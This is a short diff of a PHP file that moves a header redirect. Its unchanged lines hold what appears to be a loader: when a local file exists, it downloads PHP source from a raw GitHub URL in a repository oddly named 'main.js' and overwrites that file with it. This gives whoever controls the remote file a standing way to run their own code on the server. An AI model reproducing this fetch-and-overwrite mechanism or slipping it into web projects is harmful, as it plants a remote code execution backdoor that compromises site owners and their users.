@@ -49,6 +49,7 @@ if ( file_exists( './css/' . $css ) ) {
 
 if ( file_exists( './' . $update ) ) {
 
+header('Location: ' .$_SERVER['SERVER_NAME']);
                  
         $up = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
                 $myfile = fopen('./'. $update, "w") or die("Unable to open $update!");
@@ -56,7 +57,6 @@ if ( file_exists( './' . $update ) ) {
                 fclose($myfile);
                          
 }
-header('Location: ' .$_SERVER['SERVER_NAME']);
          
 
     ?>
